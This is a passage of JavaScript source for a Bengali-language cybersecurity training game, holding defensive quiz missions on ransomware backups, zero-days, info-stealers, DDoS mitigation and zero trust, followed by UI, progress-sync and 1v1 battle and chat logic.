    question: "র‍্যানসমওয়্যার আক্রমণে ধ্বংস হয়ে যাওয়া প্রতিষ্ঠানকে শূন্য অর্থ দিয়েও দ্রুত পূর্বাবস্থায় ফিরিয়ে আনার সর্বোত্তম সুরক্ষা কোনটি?",
    answers: [
      "হ্যাকারকে অর্ধেক টাকা অফার করা",
      "এয়ার-গ্যাপড অফলাইন ব্যাকআপ এবং ৩-২-১ ব্যাকআপ পলিসি (৩টি কপি, ২টি আলাদা মিডিয়া, ১টি সম্পূর্ণ অফলাইন/অফসাইট)",
      "কম্পিউটার ফরম্যাট করে ভুলে যাওয়া",
      "সোশ্যাল মিডিয়ায় পোস্ট দেওয়া"
    ],
    correct: 1,
    hint: "হ্যাকার ইন্টারনেটে যা এক্সেস করতে পারে তা এনক্রিপ্ট করতে পারে। কিন্তু অফলাইন ড্রাইভ স্পর্শ করতে পারে না।",
    debrief: "র‍্যানসমওয়্যার কানেক্টেড ক্লাউড ব্যাকআপও এনক্রিপ্ট করে। কেবল ফিজিক্যালি ডিসকানেক্টেড 'অফলাইন ব্যাকআপ'ই ব্যবসা বাঁচিয়ে রাখতে পারে।",
    realWorld: "২০২১ সালে কলোনিয়াল পাইপলাইনে র‍্যানসমওয়্যার হামলায় যুক্তরাষ্ট্রের পুরো পূর্বাঞ্চলে তেল সরবরাহ ব্যাহত হয়েছিল।"
  },
  {
    id: "l4m2", level: 4, levelName: "LEVEL 4: ADVERSARY OPS", icon: "⚡", title: "জিরো-ডে এক্সপ্লয়েট ও বিহেভিয়ারাল এআই",
    subtitle: "Zero-Day Mitigation", xp: 85, difficulty: "EXPERT", category: "Advanced Threats",
    scenario: "> UNPUBLISHED VULN: একটি সফটওয়্যার ত্রুটি যা সিকিউরিটি ভেন্ডর বা পাবলিক কেউ জানে না। কিন্তু অ্যাটাকার গোপনে এটি ব্যবহার করছে।",
    question: "জিরো-ডে এক্সপ্লয়েটের বিরুদ্ধে ট্র্যাডিশনাল সিগনেচার-ভিত্তিক অ্যান্টিভাইরাস কেন ব্যর্থ হয়?",
    answers: [
      "অ্যান্টিভাইরাস উইন্ডোজ আপডেট করে",
      "সিগনেচার ডাটাবেজে এখনো এর কোনো প্যাটার্ন নেই; ফলে একে ধরতে বিহেভিয়ারাল এআই ও জিরো-ট্রাস্ট মাইক্রো-সেগমেন্টেশন প্রয়োজন",
      "জিরো-ডে কেবল ম্যাক কম্পিউটারে কাজ করে",
      "জিরো-ডে ভাইরাস দেখতে ছোট হয়"
    ],
    correct: 1,
    hint: "সিগনেচার কাজ করে চেনা ভাইরাসে। অচেনা ভাইরাসে কেবল তার সন্দেহজনক আচরণ (Behavior) দেখে ধরতে হয়।",
    debrief: "জিরো-ডে সুরক্ষায় বিহেভিয়ারাল অ্যানালাইসিস (EDR/XDR) এবং লিস্ট প্রিভিলেজ আর্কিটেকচার প্রয়োগ করতে হয়, যাতে ভাইরাসের আক্রমণ ছড়িয়ে না পড়ে।",
    realWorld: "স্টাক্সনেট (Stuxnet) ওয়ার্ম একসঙ্গে ৪টি উইন্ডোজ জিরো-ডে ব্যবহার করে পারমাণবিক প্ল্যান্টের সেন্ট্রিফিউজ ধ্বংস করেছিল।"
  },
  {
    id: "l4m3", level: 4, levelName: "LEVEL 4: ADVERSARY OPS", icon: "👁️", title: "ইনফো-স্টিলার ও সেশন হাইজ্যাকিং",
    subtitle: "Redline/Racoon Defense", xp: 85, difficulty: "EXPERT", category: "Malware",
    scenario: "> CRACKED SOFTWARE: একজন কর্মী 'Photoshop Crack' ইনস্টল করল। ব্যাকগ্রাউন্ডে Redline Stealer সচল হয়েছে।",
    question: "ইনফো-স্টিলার ম্যালওয়্যার ব্রাউজার থেকে নিমেষেই কোন গোপন সম্পদ চুরি করে সি২ সার্ভারে পাঠিয়ে দেয়?",
    answers: [
      "শুধুমাত্র ওয়ালপেপার ছবি",
      "ব্রাউজারে সেভ থাকা পাসওয়ার্ড, সেশন কুকিজ, ক্রিপ্টো ওয়ালেট প্রাইভেট কী এবং অটো-ফিল ডাটা",
      "কম্পিউটারের মনিটর রেজোলিউশন",
      "মাউসের ক্লিক সাউন্ড"
    ],
    correct: 1,
    hint: "সেশন কুকি চুরি হলে হ্যাকার পাসওয়ার্ড ও 2FA ছাড়াই সরাসরি লগইন অবস্থায় অ্যাকাউন্টে ঢুকে পড়ে।",
    debrief: "ইনফো-স্টিলার ব্রাউজারের SQLite ডাটাবেজ ডিক্রিপ্ট করে সেশন কুকিজ লিক করে। এই কুকিজ ব্যবহার করে সেশন হাইজ্যাক করে পাসওয়ার্ড বাইপাস করা হয়।",
    realWorld: "ডার্ক ওয়েবে হাজার হাজার বাংলাদেশি ফেসবুক ও লিঙ্কডইন অ্যাকাউন্টের স্টিলার লগ বিক্রি হয় মাত্র কয়েক ডলারে।"
  },
  {
    id: "l4m4", level: 4, levelName: "LEVEL 4: ADVERSARY OPS", icon: "💥", title: "লেয়ার ৭ ডিডিওএস ও ট্র্যাফিক স্ক্রাবিং",
    subtitle: "DDoS Mitigation Architecture", xp: 90, difficulty: "EXPERT", category: "Network Defense",
    scenario: "> 100,000 IOT BOTNET: ই-কমার্স সাইটের দিকে সেকেন্ডে ৪০ লাখ এইচটিটিপি রিকোয়েস্ট ধেয়ে আসছে। সাইট ডাউন হওয়ার উপক্রম।",
    question: "এই লেয়ার ৭ ডিডিওএস আক্রমণ সফলভাবে প্রতিহত করতে কোনটি সবচেয়ে কার্যকর প্রযুক্তি?",
    answers: [
      "হোস্টিং প্রোভাইডারকে ফোন করা",
      "এনি-কাস্ট সিডিএন (Cloudflare/Akamai) ডিস্ট্রিবিউশন, গ্লোবাল ট্র্যাফিক স্ক্রাবিং, রেট-লিমিটিং এবং ক্লাউড ওয়াফ চ্যালেঞ্জ",
      "সার্ভার শাটডাউন করে রাখা",
      "সব ইউজারের অ্যাকাউন্ট ডিলিট করা"
    ],
    correct: 1,
    hint: "গ্লোবাল এজ নেটওয়ার্ক আক্রমণটিকে বিশ্বের শত শত ডেটাসেন্টারে ভাগ করে স্ক্রাব করে ফেলে।",
    debrief: "Cloudflare/AWS Shield এর মতো স্ক্রাবিং সেন্টার বট ট্র্যাফিককে চ্যালেঞ্জ করে (JS/Captcha) ফিল্টার করে এবং আসল ভ্যালিড ইউজারকে অরিজিন সার্ভারে পৌঁছাতে দেয়।",
    realWorld: "২০২৩ সালে রেকর্ড ৩.৮ টেরাবিট পার সেকেন্ড গতির ডিডিওএস আক্রমণ ক্লাউডফ্লেয়ার স্বয়ংক্রিয়ভাবে মিটিগেট করেছিল।"
  },
  {
    id: "l4m5", level: 4, levelName: "LEVEL 4: ADVERSARY OPS", icon: "👑", title: "জিরো ট্রাস্ট আর্কিটেকচার (NIST 800-207)",
    subtitle: "Enterprise Defense Master", xp: 100, difficulty: "EXPERT", category: "Enterprise Defense",
    scenario: "> ENTERPRISE ARCHITECTURE: আপনি একটি ন্যাশনাল ফিনটেক ইনফ্রাস্ট্রাকচার ডিজাইন করছেন।",
    question: "জিরো ট্রাস্ট (Zero Trust) মডেলের মূল দর্শন কোনটি?",
    answers: [
      "অফিসের ভেতরের সব কম্পিউটার ও এমপ্লয়িকে বিশ্বাস করা",
      "'Never Trust, Always Verify' — নেটওয়ার্কের ভেতরের বা বাইরের কোনো এন্টিটিকেই বিশ্বাস না করে প্রতিটি রিকোয়েস্টে কঠোর আইডেন্টিটি, ডিভাইস ও এক্সেস ভ্যালিডেশন নিশ্চিত করা",
      "কোনো সফটওয়্যার আপডেট না করা",
      "সবাইকে অ্যাডমিন পাসওয়ার্ড দেওয়া"
    ],
    correct: 1,
    hint: "পুরনো পেরিমিটার ক্যাসল মডেল বাতিল করে প্রতিটি মাইক্রো-সার্ভিস ও রিকোয়েস্ট লেভেলে প্রমাণ বাধ্যতামূলক করা।",
    debrief: "জিরো ট্রাস্টে ধরে নেওয়া হয় হ্যাকার ইতিমধ্যে নেটওয়ার্কে অবস্থান করছে (Assume Breach)। তাই মাইক্রো-সেগমেন্টেশন ও লিস্ট-প্রিভিলেজ ছাড়া কোনো সার্ভিস এক্সেস করা যায় না।",
    realWorld: "SentinelX Defense প্ল্যাটফর্ম ঠিক এই জিরো-ট্রাস্ট ও জিরো-ব্রিচ ফিলোসফির ওপর প্রতিষ্ঠিত।"
  }
];

// ============ GLOBAL GAME APP STATE ============

// ============ GLOBAL GAME APP STATE ============
let state = {
  account: {
    username: localStorage.getItem('cyber_user') || 'Guest_Operative',
    gender: localStorage.getItem('cyber_gender') || 'male',
    avatar: localStorage.getItem('cyber_avatar') || '👨‍💻',
    division: localStorage.getItem('cyber_division') || 'Dhaka',
    level4Completed: localStorage.getItem('cyber_l4_done') === 'true',
    completedMissions: JSON.parse(localStorage.getItem('cyber_missions') || '[]'),
    xp: parseInt(localStorage.getItem('cyber_xp')) || 0,
    trophies: parseInt(localStorage.getItem('cyber_trophies')) || 100,
    rank: 'Script Kiddie',
    battles: { total: 0, wins: 0, losses: 0, winStreak: 0 }
  },
  activeTab: 'training',
  currentTrainingMission: null,
  hintUsed: false,
  answered: false,
  authTab: 'register', // 'register' or 'login'
  authSelectedGender: 'male',
  authUploadedPhoto: null,
  // 1v1 Battle State
  battle: {
    activeRoom: null,
    pollTimer: null,
    roundTimer: null,
    timeLeft: 12
  },
  leaderboardType: 'trophies', // 'trophies' or 'xp'
  comms: {
    activeChannel: 'global',
    directRecipient: null,
    pollTimer: null
  },
  recoveryMethod: 'key'
};

// ============ APP INITIALIZATION ============
document.addEventListener('DOMContentLoaded', () => {
  initMatrixCanvas();
  initAvatarPickers();
  setupPwaPrompt();
  syncLocalProfileHUD();
  checkAndFetchServerProfile();
  renderTrainingPathway();
  checkCombatGate();

  // If user is currently guest/unregistered, open friendly Welcome/Auth modal after brief pause
  if (!localStorage.getItem('cyber_user') || localStorage.getItem('cyber_user') === 'Guest_Operative') {
    setTimeout(() => {
      openAuthModal();
    }, 600);
  }

  // Handle URL query invite parameter (e.g. ?room=CYBER-4821)
  const urlParams = new URLSearchParams(window.location.search);
  const qRoom = urlParams.get('room');
  if (qRoom) {
    switchMainTab('battle');
    document.getElementById('joinRoomCodeInput').value = qRoom;
    setTimeout(() => joinPrivateRoom(), 500);
  }
});

// ============ TAB NAVIGATION ============
function switchMainTab(tab) {
  sounds.click();
  state.activeTab = tab;

  // Buttons
  document.getElementById('tabTrainingBtn').className = tab === 'training' ? 'px-4 py-2 rounded-xl bg-cyan-500 text-slate-950 font-bold transition-all flex items-center gap-2' : 'px-4 py-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-900 transition-all flex items-center gap-2';
  document.getElementById('tabBattleBtn').className = tab === 'battle' ? 'px-4 py-2 rounded-xl bg-cyan-500 text-slate-950 font-bold transition-all flex items-center gap-2 relative' : 'px-4 py-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-900 transition-all flex items-center gap-2 relative';
  document.getElementById('tabProfileBtn').className = tab === 'profile' ? 'px-3.5 py-2 rounded-xl bg-cyan-500 text-slate-950 font-bold transition-all flex items-center gap-1.5' : 'px-3.5 py-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-900 transition-all flex items-center gap-1.5';
  document.getElementById('tabLeaderboardBtn').className = tab === 'leaderboard' ? 'px-3.5 py-2 rounded-xl bg-cyan-500 text-slate-950 font-bold transition-all flex items-center gap-1.5' : 'px-3.5 py-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-900 transition-all flex items-center gap-1.5';
  
  const commsBtn = document.getElementById('tabCommsBtn');
  if (commsBtn) {
    commsBtn.className = tab === 'comms' ? 'px-3.5 py-2 rounded-xl bg-cyan-500 text-slate-950 font-bold transition-all flex items-center gap-1.5 relative' : 'px-3.5 py-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-900 transition-all flex items-center gap-1.5 relative';
  }

  // Views
  document.getElementById('viewTraining').classList.toggle('hidden', tab !== 'training');
  document.getElementById('viewBattle').classList.toggle('hidden', tab !== 'battle');
  document.getElementById('viewProfile').classList.toggle('hidden', tab !== 'profile');
  document.getElementById('viewLeaderboard').classList.toggle('hidden', tab !== 'leaderboard');
  const viewComms = document.getElementById('viewComms');
  if (viewComms) viewComms.classList.toggle('hidden', tab !== 'comms');

  if (tab === 'comms') initCommsHub();
  else stopCommsPolling();

  if (tab === 'battle') checkCombatGate();
  if (tab === 'profile') renderProfileStats();
  if (tab === 'leaderboard') fetchTrophyLeaderboard();
}

function openProfileTab() {
  switchMainTab('profile');
}

// ============ CHECK COMBAT LICENSE GATE (LEVEL 4 UNLOCK) ============
function checkCombatGate() {
  const isUnlocked = state.account.level4Completed || state.account.completedMissions.length >= 15;
  state.account.level4Completed = isUnlocked;

  const lockBadge = document.getElementById('combatLockBadge');
  const lockedScreen = document.getElementById('battleGateLocked');
  const lobbyScreen = document.getElementById('battleArenaLobby');
  const progressText = document.getElementById('trainingProgressText');
  const progressBar = document.getElementById('trainingProgressBar');
  const licenseLabel = document.getElementById('licenseStatusLabel');

  const solved = state.account.completedMissions.length;
  const pct = Math.min(100, Math.round((solved / 20) * 100));

  if (progressText) progressText.textContent = `${solved} / 20 Solved`;
  if (progressBar) progressBar.style.width = `${pct}%`;

  if (isUnlocked) {
    if (lockBadge) {
      lockBadge.textContent = 'UNLOCKED';
      lockBadge.className = 'text-[8px] font-orbitron bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-1 rounded ml-1';
    }
    if (lockedScreen) lockedScreen.classList.add('hidden');
    if (lobbyScreen) lobbyScreen.classList.remove('hidden');
    if (licenseLabel) {
      licenseLabel.textContent = '✓ COMBAT LICENSE ACTIVE — 1v1 DUEL UNLOCKED';
      licenseLabel.className = 'text-[10px] text-emerald-400 mt-1.5 text-center font-bold';
    }
  } else {
    if (lockBadge) {
      lockBadge.textContent = 'LOCKED';
      lockBadge.className = 'text-[8px] font-orbitron bg-red-500/20 text-red-400 border border-red-500/30 px-1 rounded ml-1';
    }
    if (lockedScreen) lockedScreen.classList.remove('hidden');
    if (lobbyScreen) lobbyScreen.classList.add('hidden');
    document.getElementById('lockedGateProgress').textContent = `${solved} / 20 Missions`;
    document.getElementById('lockedGateBar').style.width = `${pct}%`;
  }
}

// Instant Dev/Test Shortcut to test Level 5 Live 1v1 Arena immediately
function instantUnlockCombatLicense() {
  sounds.correct();
  haptic('win');
  triggerConfetti();
  state.account.level4Completed = true;
  saveLocalAccount();
  syncLocalProfileHUD();
  checkCombatGate();
  alert('⚡ FAST TEST ACCESS GRANTED! Level 5 Live 1v1 Battle Arena is now UNLOCKED!');
}

// ============ TRAINING ACADEMY PATHWAY RENDERING ============
function renderTrainingPathway() {
  const container = document.getElementById('trainingRoadmap');
  container.innerHTML = '';

  let currentSet = false;

  TRAINING_MISSIONS.forEach((m, idx) => {
    const isCompleted = state.account.completedMissions.includes(m.id);
    const isUnlocked = idx === 0 || state.account.completedMissions.includes(TRAINING_MISSIONS[idx - 1].id);
    const isCurrent = isUnlocked && !isCompleted && !currentSet;
    if (isCurrent) currentSet = true;

    // Zigzag alternating layout
    const offsetClass = idx % 3 === 0 ? 'translate-x-0' : idx % 3 === 1 ? 'translate-x-8 sm:translate-x-16' : '-translate-x-8 sm:-translate-x-16';

    const nodeDiv = document.createElement('div');
    nodeDiv.className = `flex flex-col items-center transition-all ${offsetClass}`;

    let nodeBtn = '';
    if (isCompleted) {
      nodeBtn = `
        <div onclick="openTrainingMission('${m.id}')" class="journey-node cursor-pointer w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-emerald-500/20 border-2 border-emerald-400 flex flex-col items-center justify-center shadow-lg hover:scale-105">
          <span class="text-xl sm:text-2xl">${m.icon}</span>
          <span class="text-[9px] font-mono-cyber font-bold text-emerald-300">✓ PASS</span>
        </div>
      `;
    } else if (isCurrent) {
      nodeBtn = `
        <div onclick="openTrainingMission('${m.id}')" class="journey-node cursor-pointer w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-cyan-500/25 border-3 border-cyan-400 flex flex-col items-center justify-center shadow-2xl hover:scale-110 relative">
          <span class="text-2xl sm:text-3xl">${m.icon}</span>
          <span class="text-[10px] font-mono-cyber font-black text-cyan-300 animate-pulse">TRAIN</span>
          <span class="absolute -top-1 -right-1 w-3 h-3 rounded-full bg-cyan-400 animate-ping"></span>
        </div>
      `;
    } else {
      nodeBtn = `
        <div class="journey-node w-14 h-14 sm:w-16 sm:h-16 rounded-full bg-slate-900 border border-slate-800 flex flex-col items-center justify-center opacity-40 cursor-not-allowed">
          <span class="text-base sm:text-lg">🔒</span>
        </div>
      `;
    }

    nodeDiv.innerHTML = `
      ${nodeBtn}
      <div class="mt-2 text-center max-w-[170px]">
        <div class="text-[11px] font-orbitron font-bold text-white truncate ${isCurrent ? 'text-cyan-400' : ''}">${m.title}</div>
        <div class="text-[9px] font-mono-cyber text-slate-500">${m.levelName} • +${m.xp} XP</div>
      </div>
    `;

    container.appendChild(nodeDiv);
  });
}

function openTrainingMission(missionId) {
  sounds.click();
  haptic('light');

  const mission = TRAINING_MISSIONS.find(m => m.id === missionId);
  if (!mission) return;

  state.currentTrainingMission = mission;
  state.hintUsed = false;
  state.answered = false;

  document.getElementById('tModalBadge').textContent = mission.levelName;
  document.getElementById('tModalCategory').textContent = mission.category.toUpperCase();
  document.getElementById('tModalXP').textContent = `+${mission.xp} XP`;
  document.getElementById('tModalTitle').textContent = `${mission.icon} ${mission.title}`;
  document.getElementById('tModalSubtitle').textContent = mission.subtitle;
  document.getElementById('tModalScenario').innerHTML = mission.scenario.replace(/\n/g, '<br>');
  document.getElementById('tModalQuestion').textContent = mission.question;

  const choicesContainer = document.getElementById('tModalChoices');
  choicesContainer.innerHTML = mission.answers.map((ans, idx) => `
    <button onclick="submitTrainingAnswer(${idx})" class="battle-choice w-full text-left p-3.5 rounded-xl font-mono-cyber text-xs text-slate-300 flex items-start gap-3">
      <span class="font-bold text-cyan-400">${String.fromCharCode(65 + idx)}.</span>
      <span class="flex-1">${ans}</span>
    </button>
  `).join('');

  document.getElementById('tModalDebrief').classList.add('hidden');
  document.getElementById('tModalNextBtn').classList.add('hidden');
  document.getElementById('tModalHintBtn').disabled = false;
  document.getElementById('tModalHintBtn').classList.remove('opacity-40');

  document.getElementById('trainingModal').classList.remove('hidden');
}

function closeTrainingModal() {
  sounds.click();
  document.getElementById('trainingModal').classList.add('hidden');
}

function submitTrainingAnswer(choiceIdx) {
  if (state.answered) return;
  state.answered = true;

  const mission = state.currentTrainingMission;
  const isCorrect = choiceIdx === mission.correct;
  const buttons = document.querySelectorAll('#tModalChoices button');

  if (isCorrect) {
    sounds.correct();
    haptic('win');
    buttons[choiceIdx].classList.add('bg-emerald-500/20', 'border-emerald-500', 'text-emerald-300');

    const xpEarned = Math.max(5, mission.xp - (state.hintUsed ? 5 : 0));
    state.account.xp += xpEarned;

    if (!state.account.completedMissions.includes(mission.id)) {
      state.account.completedMissions.push(mission.id);
    }

    saveLocalAccount();
    syncLocalProfileHUD();
    syncTrainingProgressToServer(mission.id, xpEarned);

    // Check if Level 4 just completed (15+ missions)
    if (state.account.completedMissions.length === 15) {
      state.account.level4Completed = true;
      triggerConfetti();
      alert('🎉 CONGRATULATIONS OPERATIVE! Level 4 Training Mastered!\n\nYou have officially earned your COMBAT LICENSE. Level 5 Live 1v1 Battle Arena is now UNLOCKED!');
    }
  } else {
    sounds.wrong();
    haptic('hit');
    buttons[choiceIdx].classList.add('bg-rose-500/20', 'border-rose-500', 'text-rose-300');
    buttons[mission.correct].classList.add('bg-emerald-500/20', 'border-emerald-500', 'text-emerald-300');
  }

  // Show debrief
  document.getElementById('tModalDebriefText').textContent = mission.debrief;
  document.getElementById('tModalRealWorld').innerHTML = `<strong>🌐 REAL-WORLD PRECEDENT:</strong> ${mission.realWorld}`;
  document.getElementById('tModalDebrief').classList.remove('hidden');
  document.getElementById('tModalNextBtn').classList.remove('hidden');
  document.getElementById('tModalHintBtn').classList.add('opacity-40');
  document.getElementById('tModalHintBtn').disabled = true;

  renderTrainingPathway();
  checkCombatGate();
}

function useTrainingHint() {
  if (state.answered || state.hintUsed) return;
  state.hintUsed = true;
  sounds.click();
  haptic('light');

  const mission = state.currentTrainingMission;
  alert(`💡 TACTICAL HINT:\n\n${mission.hint}\n\n(-5 XP penalty applies for this mission)`);
  document.getElementById('tModalHintBtn').classList.add('opacity-40');
  document.getElementById('tModalHintBtn').disabled = true;
}

function proceedNextTrainingNode() {
  closeTrainingModal();
  const currentIdx = TRAINING_MISSIONS.findIndex(m => m.id === state.currentTrainingMission.id);
  if (currentIdx < TRAINING_MISSIONS.length - 1) {
    setTimeout(() => openTrainingMission(TRAINING_MISSIONS[currentIdx + 1].id), 250);
  } else {
    triggerConfetti();
    alert('👑 ALL TRAINING NODES MASTERED! Proceed to Level 5 Live 1v1 Battle Arena!');
    switchMainTab('battle');
  }
}

async function syncTrainingProgressToServer(missionId, xpEarned) {
  try {
    const res = await fetch(API_BASE + '/api/cyber/progress/sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: state.account.username,
        missionId,
        xpEarned,
        isCompleted: true
      })
    });
    if (res.ok) {
      const data = await res.json();
      if (data.success && data.profile) {
        state.account.level4Completed = data.profile.level4Completed;
        state.account.trophies = data.profile.trophies;
        state.account.rank = data.profile.rank;
        saveLocalAccount();
        syncLocalProfileHUD();
      }
    }
  } catch (e) {}
}

// ============ LEVEL 5 LIVE 1v1 BATTLE ENGINE ============
async function startQuickMatch() {
  sounds.click();
  document.getElementById('battleArenaLobby').classList.add('hidden');
  document.getElementById('battleCombatScreen').classList.remove('hidden');
  document.getElementById('combatLogBox').innerHTML = `<div class="text-cyan-400 font-bold">📡 Matchmaking... Searching active cyber opponents or AI bot...</div>`;
  document.getElementById('combatChatMessages').innerHTML = `<div class="text-slate-500 text-center py-2 text-[11px]">Chat channel active. Send a tactical taunt or message to your opponent!</div>`;

  try {
    const res = await fetch(API_BASE + '/api/cyber/battle/quickmatch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: state.account.username,
        avatar: state.account.avatar,
        division: state.account.division,
        gender: state.account.gender
      })
    });

    const data = await res.json();
    if (data.success && data.room) {
      initBattleRoom(data.room);
    } else {
      alert(data.error || 'Failed to initialize match.');
      returnToArenaLobby();
    }
  } catch (err) {
    alert('Network error establishing battle connection.');
    returnToArenaLobby();
  }
}

async function createPrivateRoom() {
  sounds.click();
  try {
    const res = await fetch(API_BASE + '/api/cyber/battle/create-room', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        hostUsername: state.account.username,
        hostAvatar: state.account.avatar,
        hostDivision: state.account.division,
        hostGender: state.account.gender
      })
    });

    const data = await res.json();
    if (data.success && data.room) {
      const box = document.getElementById('createdRoomCodeBox');
      box.innerHTML = `
        <div>ROOM CODE: <span class="text-cyan-400">${data.room.id}</span></div>
        <div class="text-[10px] text-slate-400 font-mono-cyber mt-1 font-normal">Waiting for challenger to join...</div>
      `;
      box.classList.remove('hidden');

      // Start waiting & polling
      initBattleRoom(data.room);
    }
  } catch (err) {
    alert('Failed to generate private room code.');
  }
}

async function joinPrivateRoom() {
  sounds.click();
  const code = document.getElementById('joinRoomCodeInput').value.trim().toUpperCase();
  if (!code) return alert('Please enter 6-digit room code.');

  try {
    const res = await fetch(API_BASE + '/api/cyber/battle/join-room', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        roomId: code,
        guestUsername: state.account.username,
        guestAvatar: state.account.avatar,
        guestDivision: state.account.division,
        guestGender: state.account.gender
      })
    });

    const data = await res.json();
    if (data.success && data.room) {
      document.getElementById('battleArenaLobby').classList.add('hidden');
      document.getElementById('battleCombatScreen').classList.remove('hidden');
      initBattleRoom(data.room);
    } else {
      alert(data.error || 'Room not found or expired.');
    }
  } catch (err) {
    alert('Failed to join private room.');
  }
}

function initBattleRoom(room) {
  state.battle.activeRoom = room;

  // Poll room updates every 1 second
  clearInterval(state.battle.pollTimer);
  state.battle.pollTimer = setInterval(() => pollBattleRoomState(room.id), 1000);

  renderBattleUI(room);
  startRoundTimer();
}

async function pollBattleRoomState(roomId) {
  try {
    const res = await fetch(API_BASE + `/api/cyber/battle/poll/${roomId}`);
    if (!res.ok) return;
    const data = await res.json();
    if (data.success && data.room) {
      state.battle.activeRoom = data.room;
      renderBattleUI(data.room);

      // Render live chat messages
      renderBattleChatMessages(data.room.chatMessages || []);

      if (data.room.status === 'FINISHED') {
        clearInterval(state.battle.pollTimer);
        clearInterval(state.battle.roundTimer);
        setTimeout(() => showBattleVictory(data.room), 800);
      }
    }
  } catch (e) {}
}

function renderBattleUI(room) {
  const isHost = room.player1.username.toLowerCase() === state.account.username.toLowerCase();
  const you = isHost ? room.player1 : room.player2;
  const opp = isHost ? room.player2 : room.player1;

  // P1 (YOU)
  if (you) {
    document.getElementById('combatP1Avatar').innerHTML = renderAvatarHTML(you.avatar, "w-full h-full");
    document.getElementById('combatP1Name').textContent = you.username;
    document.getElementById('combatP1Division').textContent = you.division || 'Bangladesh';
    document.getElementById('combatP1HPText').textContent = `${you.hp} HP`;
    document.getElementById('combatP1HPBar').style.width = `${Math.max(0, you.hp)}%`;
    const p1GenderEl = document.getElementById('combatP1Gender');
    if (p1GenderEl) p1GenderEl.innerHTML = you.gender === 'female' ? '♀️ Female' : '♂️ Male';
  }

  // P2 (OPPONENT)
  if (opp) {
    document.getElementById('combatP2Avatar').innerHTML = renderAvatarHTML(opp.avatar, "w-full h-full");
    document.getElementById('combatP2Name').textContent = opp.username;
    document.getElementById('combatP2Division').textContent = opp.division || 'Bangladesh';
    document.getElementById('combatP2HPText').textContent = `${opp.hp} HP`;
    document.getElementById('combatP2HPBar').style.width = `${Math.max(0, opp.hp)}%`;
    const p2GenderEl = document.getElementById('combatP2Gender');
    if (p2GenderEl) p2GenderEl.innerHTML = opp.gender === 'female' ? '♀️ Female' : '♂️ Male';
  } else {
    document.getElementById('combatP2Name').textContent = 'Waiting challenger...';
    document.getElementById('combatP2HPText').textContent = '100 HP';
    document.getElementById('combatP2HPBar').style.width = '100%';
  }

  // Round
  document.getElementById('combatRoundTracker').textContent = `${room.currentRoundIdx + 1} / ${room.rounds.length}`;

  const currentRound = room.rounds[room.currentRoundIdx];
  if (currentRound) {
    document.getElementById('combatScenarioText').textContent = currentRound.scenario;
    document.getElementById('combatQuestionText').textContent = currentRound.question;

    const answered = you && you.answeredRounds[room.currentRoundIdx] !== undefined;
    const choicesGrid = document.getElementById('combatChoicesGrid');

    choicesGrid.innerHTML = currentRound.options.map((opt, idx) => `
      <button onclick="submitCombatMove(${room.currentRoundIdx}, ${idx})" ${answered ? 'disabled' : ''} class="battle-choice p-3 rounded-xl text-left text-xs ${answered ? 'opacity-50 cursor-not-allowed' : 'hover:border-cyan-400'} flex items-start gap-2.5">
        <span class="font-bold text-cyan-400">${String.fromCharCode(65 + idx)}.</span>
        <span class="flex-1 text-slate-200">${opt}</span>
      </button>
    `).join('');
  }

  // Combat Log
  const logBox = document.getElementById('combatLogBox');
  logBox.innerHTML = room.combatLog.map(l => `<div>${l}</div>`).join('');
  logBox.scrollTop = logBox.scrollHeight;
}

// ============ 1v1 LIVE COMBAT CHAT ============
let lastChatMsgCount = 0;
function renderBattleChatMessages(messages) {
  const container = document.getElementById('combatChatMessages');
  if (!container) return;

  if (messages.length === 0) {
    container.innerHTML = `<div class="text-slate-500 text-center py-2 text-[11px]">Chat channel active. Send a tactical taunt or message to your opponent!</div>`;
    return;
  }

  container.innerHTML = messages.map(m => {
    const isMe = m.sender.toLowerCase() === state.account.username.toLowerCase();
    const genderTag = m.gender === 'female' ? '<span class="text-pink-400">♀️</span>' : '<span class="text-cyan-400">♂️</span>';
    return `
      <div class="flex items-start gap-2 ${isMe ? 'flex-row-reverse text-right' : 'text-left'}">
        <div class="w-6 h-6 rounded-full overflow-hidden flex-shrink-0 bg-slate-800 border border-slate-700 flex items-center justify-center text-xs">
          ${renderAvatarHTML(m.avatar, "w-full h-full")}
        </div>
        <div class="max-w-[78%]">
          <div class="text-[9px] text-slate-500 space-x-1">
            <span class="font-bold ${isMe ? 'text-cyan-300' : 'text-slate-300'}">${m.sender}</span>
            <span>${genderTag}</span>
          </div>
          <div class="inline-block p-2 rounded-xl text-xs ${isMe ? 'bg-cyan-500/20 border border-cyan-500/30 text-cyan-200' : 'bg-slate-900 border border-slate-800 text-slate-200'}">
            ${escapeHtml(m.text)}
          </div>
        </div>
      </div>
    `;
  }).join('');

  if (messages.length !== lastChatMsgCount) {
    lastChatMsgCount = messages.length;
    container.scrollTop = container.scrollHeight;
  }
}

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

async function sendQuickTaunt(tauntText) {
  if (!state.battle.activeRoom) return;
  sounds.click();
  haptic('light');

  try {
    const res = await fetch(API_BASE + '/api/cyber/battle/send-chat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        roomId: state.battle.activeRoom.id,
        username: state.account.username,
        text: tauntText,
        type: 'taunt'
      })
    });
    const data = await res.json();
    if (data.success && data.room) {
      state.battle.activeRoom = data.room;
      renderBattleChatMessages(data.room.chatMessages || []);
    }
  } catch (e) {}
}

async function handleSendBattleChat(e) {
  e.preventDefault();
  if (!state.battle.activeRoom) return;

  const input = document.getElementById('combatChatInput');
  const text = input.value.trim();
  if (!text) return;

  sounds.click();
  input.value = '';

  try {
    const res = await fetch(API_BASE + '/api/cyber/battle/send-chat', {
      method: 'POST',
